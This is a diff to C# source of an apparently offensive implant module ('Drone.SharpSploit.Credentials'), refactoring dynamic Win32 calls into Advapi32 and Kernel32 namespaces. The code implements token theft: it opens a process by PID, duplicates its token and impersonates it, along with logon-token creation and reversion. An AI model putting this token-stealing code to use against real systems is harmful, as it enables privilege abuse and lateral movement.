@@ -25,7 +25,7 @@ namespace Drone.SharpSploit.Credentials
         {
             var token = IntPtr.Zero;
 
-            var success = DInvoke.DynamicInvoke.Win32.LogonUserA(username, domain, password,
+            var success = DInvoke.DynamicInvoke.Win32.Advapi32.LogonUserA(username, domain, password,
                 Win32.Advapi32.LogonUserType.LOGON32_LOGON_NEW_CREDENTIALS,
                 Win32.Advapi32.LogonUserProvider.LOGON32_PROVIDER_DEFAULT,
                 ref token);
@@ -44,7 +44,7 @@ namespace Drone.SharpSploit.Credentials
         }
 
         public bool Impersonate()
-            => DInvoke.DynamicInvoke.Win32.ImpersonateLoggedOnUser(_handle);
+            => DInvoke.DynamicInvoke.Win32.Advapi32.ImpersonateLoggedOnUser(_handle);
 
         public bool Steal(uint pid)
         {
@@ -53,19 +53,19 @@ namespace Drone.SharpSploit.Credentials
                 Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS);
 
             var hToken = IntPtr.Zero;
-            var success = DInvoke.DynamicInvoke.Win32.OpenProcessToken(
+            var success = DInvoke.DynamicInvoke.Win32.Advapi32.OpenProcessToken(
                 hProcess,
                 Win32.Advapi32.TokenAccess.TOKEN_ALL_ACCESS,
                 ref hToken);
 
             if (!success)
             {
-                DInvoke.DynamicInvoke.Win32.CloseHandle(hProcess);
+                DInvoke.DynamicInvoke.Win32.Kernel32.CloseHandle(hProcess);
                 return false;
             }
 
             var hNewToken = IntPtr.Zero;
-            success = DInvoke.DynamicInvoke.Win32.DuplicateTokenEx(
+            success = DInvoke.DynamicInvoke.Win32.Advapi32.DuplicateTokenEx(
                 hToken,
                 Win32.Advapi32.TokenAccess.TOKEN_ALL_ACCESS,
                 Win32.WinNT.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
@@ -74,13 +74,13 @@ namespace Drone.SharpSploit.Credentials
 
             if (!success)
             {
-                DInvoke.DynamicInvoke.Win32.CloseHandle(hToken);
-                DInvoke.DynamicInvoke.Win32.CloseHandle(hProcess);
+                DInvoke.DynamicInvoke.Win32.Kernel32.CloseHandle(hToken);
+                DInvoke.DynamicInvoke.Win32.Kernel32.CloseHandle(hProcess);
                 return false;
             }
             
-            DInvoke.DynamicInvoke.Win32.CloseHandle(hProcess);
-            DInvoke.DynamicInvoke.Win32.CloseHandle(hToken);
+            DInvoke.DynamicInvoke.Win32.Kernel32.CloseHandle(hProcess);
+            DInvoke.DynamicInvoke.Win32.Kernel32.CloseHandle(hToken);
 
             _handle = hNewToken;
             Handle = $"0x{_handle.ToInt64()}";
@@ -91,12 +91,12 @@ namespace Drone.SharpSploit.Credentials
         }
 
         public static bool Revert()
-            => DInvoke.DynamicInvoke.Win32.RevertToSelf();
+            => DInvoke.DynamicInvoke.Win32.Advapi32.RevertToSelf();
 
         public void Dispose()
         {
             Revert();
-            DInvoke.DynamicInvoke.Win32.CloseHandle(_handle);
+            DInvoke.DynamicInvoke.Win32.Kernel32.CloseHandle(_handle);
         }
 
         protected internal override IList<SharpSploitResultProperty> ResultProperties =>
